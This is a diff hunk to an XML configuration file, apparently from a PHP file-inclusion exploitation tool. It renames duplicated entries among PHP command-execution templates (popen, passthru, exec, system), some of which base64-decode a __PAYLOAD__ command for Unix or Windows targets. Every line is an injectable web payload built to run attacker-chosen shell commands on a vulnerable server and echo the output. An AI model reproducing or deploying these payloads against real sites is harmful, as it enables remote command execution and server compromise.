@@ -24,16 +24,16 @@
 		<exec unix="1" win="0" dobase64="0" name="popen"    	 source='&lt;?php $h=popen("__PAYLOAD__" . " 2&gt;&amp;1", "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
 		<exec unix="1" win="0" dobase64="0" name="passthru" 	 source='&lt;?php passthru ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
 		<exec unix="1" win="0" dobase64="0" name="exec"     	 source='&lt;?php echo exec ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
-		<exec unix="1" win="0" dobase64="0" name="popen"    	 source='&lt;?php system ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
+		<exec unix="1" win="0" dobase64="0" name="system"    	 source='&lt;?php system ("__PAYLOAD__". " 2&gt;&amp;1"); ?&gt;' />
 		
 		<exec unix="0" win="1" dobase64="1" name="popen[b64][win]"    source='&lt;?php $h=popen(base64_decode("__PAYLOAD__") , "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
 		<exec unix="0" win="1" dobase64="1" name="passthru[b64][win]" source='&lt;?php passthru (base64_decode("__PAYLOAD__")); ?&gt;' />
 		<exec unix="0" win="1" dobase64="1" name="exec[b64][win]"     source='&lt;?php echo exec (base64_decode("__PAYLOAD__")); ?&gt;' />
 		<exec unix="0" win="1" dobase64="1" name="popen[b64][win]"    source='&lt;?php system (base64_decode("__PAYLOAD__")); ?&gt;' />
-		<exec unix="0" win="1" dobase64="0" name="popen[win]"     	 source='&lt;?php $h=popen("__PAYLOAD__" , "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
-		<exec unix="0" win="1" dobase64="0" name="passthru[win]"  	 source='&lt;?php passthru ("__PAYLOAD__"); ?&gt;' />
-		<exec unix="0" win="1" dobase64="0" name="exec[win]"      	 source='&lt;?php echo exec ("__PAYLOAD__"); ?&gt;' />
-		<exec unix="0" win="1" dobase64="0" name="popen[win]"     	 source='&lt;?php system ("__PAYLOAD__"); ?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="popen[win]"         source='&lt;?php $h=popen("__PAYLOAD__" , "r");while(!feof($h)){$l=fread($h, 2024);echo $l;}?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="passthru[win]"      source='&lt;?php passthru ("__PAYLOAD__"); ?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="exec[win]"          source='&lt;?php echo exec ("__PAYLOAD__"); ?&gt;' />
+		<exec unix="0" win="1" dobase64="0" name="system[win]"        source='&lt;?php system ("__PAYLOAD__"); ?&gt;' />
 	</exec_methods> 
 	
 	<payloads>
